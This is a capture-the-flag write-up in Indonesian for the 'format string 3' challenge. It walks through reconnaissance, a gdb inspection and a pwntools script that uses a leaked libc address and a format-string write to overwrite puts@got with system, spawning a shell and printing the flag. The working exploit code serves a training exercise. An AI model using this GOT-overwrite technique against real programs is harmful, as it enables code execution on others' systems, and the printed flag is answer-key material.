# format string 3

file attached : ld-linux-x86-64.so  libc.so.6  vuln

## summary
chall ini memiliki kerentanan format string yang bisa digunakan untuk merubah sebuah pointer menunjuk ke fungsi yang berbeda. di kasus ini terdapat sebuah fungsi puts(/bin/sh).
dengan memanfaatkan kerentanan format string , aku bisa merubah nya menjadi system(/bin/sh) dan mendapatkan shell.

# analysis & exploit step by step

cek informasi umum seperti metadata dan tampilan program saat di jalankan: 

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> ./vuln
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ec0ac8c23f0
nice
nice
/bin/sh
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so, BuildID[sha1]=ba6e8102b966fc365d83b96747101badc531c171, for GNU/Linux 3.2.0, not stripped
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> pwn checksec vuln
[*] '/home/rotalactf/reno/pwn/picoctf/format-string-3/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> ./vuln
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7b0fe1dd03f0
helo <-- input
helo <-- output
/bin/sh
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> ./vuln
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7a4da0a553f0
%p
0x7a4da0bb3963 
/bin/sh
```

chall ini cukup baik hati karena ia mencetak alamat dari salah satu fungsi di libc, jadi aku tidak perlu repot repot melakukan leaking address libc. 
**setvbuf : 0x7..........3f0**

selain itu chall ini juga memiliki kerentanan format string yang memungkinkan aku bisa meleak address di sekitar fungsi printf nya atau bahkan menulis data di program.

terakhir perlu diperhatikan juga ada string /bin/sh di bawah, misterius. aku lanjutkan analisis dengan gdb dan menemukan bahwa memang ada fungsi yang sengaja mencetak string itu
```Assembly
────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────
b► 0x4012d9 <main+150>    mov    rdi, rax     RDI => 0x402008 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x4012dc <main+153>    call   puts@plt                    <puts@plt>



```

sekarang bagaimana jika aku merubah puts itu menjadi system? jika bisa maka sintaks nya dari puts(/bin/sh) akan berubah menjadi system(/bin/sh).  


rencananya : gunakan kerentanan format string untuk memanipulasi alamat pointer yang awalnya menunjuk ke puts menjadi menunjuk ke system. 

## exploit

pertama aku cari start index atau tempat input ku di simpan di celah format string ini, aku menggunakan tools buatanku sendiri.

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-3)
└> python3 SeeIn_v0.3.py LOCAL | grep start
  start idx              38             0x253a702431254444     b'%:p$1%DD'
```
index : 38

selanjutnya adalah merubah puts@got menjadi alamat system, jadi puts@plt akan jadi pointer yg menunjuk ke system.

skrip python : 
```Python
from pwn import *

lib = ELF("./libc.so.6")
elf = context.binary = ELF("./vuln")
p = process()

p.recvuntil(b': ')
leak = int(p.recvline().strip().decode(),16)
lib.address = leak - lib.sym.setvbuf

of = 38
puts = elf.got.puts
sys = lib.sym.system

v = {puts:sys}

py = fmtstr_payload(of,v,write_size="byte")
p.sendline(py)
p.interactive()
```

```

[*] Switching to interactive mode
                                                                                               cc                    \x8b   \xf0                                                                                                                                                                                                                          ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
academy{G07_G07?_a42d872f}$
```

flag : **academy{G07_G07?_a42d872f}$
**
